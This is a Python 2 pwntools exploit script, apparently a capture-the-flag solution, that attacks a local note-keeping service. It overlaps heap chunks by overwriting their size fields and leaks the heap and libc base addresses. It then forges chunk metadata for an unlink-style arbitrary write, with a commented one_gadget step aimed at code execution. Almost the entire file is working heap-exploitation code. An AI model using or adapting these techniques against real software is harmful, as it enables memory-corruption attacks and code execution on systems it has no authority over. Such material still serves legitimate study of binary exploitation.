#!/usr/bin/env python2

from pwn import *
from IPython import embed

context.arch = 'amd64'

e = ELF('./libc.so.6')
r = remote('127.0.0.1', 7122)

def menu():
	r.recvuntil('Your choice: \n')

def add(sz, nt):
	menu()
	r.send('1')
	r.recvuntil('size: \n')
	r.send(str(sz))
	r.recvuntil('note: \n')
	r.send(nt)

def dele(idx):
	menu()
	r.send('2')
	r.recvuntil('index: \n')
	r.send(str(idx))

def show(idx):
	menu()
	r.send('3')
	r.recvuntil('index: \n')
	r.send(str(idx))
	return r.recvuntil('=', drop=True)

def edit(idx, nt):
	menu()
	r.send('4')
	r.recvuntil('index: \n')
	r.send(str(idx))
	r.recvuntil('note: \n')
	r.send(nt)

size = [288-8]*7+[144-8]*5
for i in range(len(size)):
	if i:
		add(size[i], chr(i*0x11)*size[i])
	else:
		add(size[i], chr(0x20)*size[i])
edit(0, 'A'*280+flat(0x120*7|0x1))
edit(8, '\x88'*(136-8)+flat(0x120*7))
dele(1)
dele(3)
dele(5)
add(280, 'A'*8)
x = show(1)
heap_base = u64(x[15:-1].ljust(8, '\x00'))-0x5a0
print 'heap_base:', hex(heap_base)
#r.interactive()
add(280, '\x78')
x = show(3)
libc_heap = u64(x[-7:-1].ljust(8,'\0'))
print hex(libc_heap)

#			    puts		heap
libc_heap_puts_off = 0x00007fbdc99d0690-0x00007fbdc9d25b78 
libc_puts = libc_heap+libc_heap_puts_off
print 'libc_puts:', hex(libc_puts)
libc_base = libc_puts-e.symbols['puts']
print 'libc_base:', hex(libc_base)

#r.interactive()
dele(0xa)
bin_off = 0x7fa514df8bf8-0x7fa514a34000
bin_addr = libc_base+bin_off
curr_heap = heap_base+0x700
#raw_input('@')
add(0x120*7-8, ('a'*(0x120*6-8)+
		flat(0x91, heap_base+0x870, heap_base+0x870)+
		'\x77'*(136-24)+
		flat(0x90, 0x80, heap_base+0x7e0, heap_base+0x7e0)
	       ).ljust(0x120*7-24, '\xff')+
		flat(0xa1)
		#flat(0x7e0)
   )
dele(8)
dele(5)
raw_input('@@')
add(0x120*7-8, flat(0x91, 0x6020f0-0x18, 0x6020f0-0x10).rjust(0x120*6-8))
r.interactive()
#one_gadget = 0xf1117
#add(248, flat(libc_base+one_gadget))

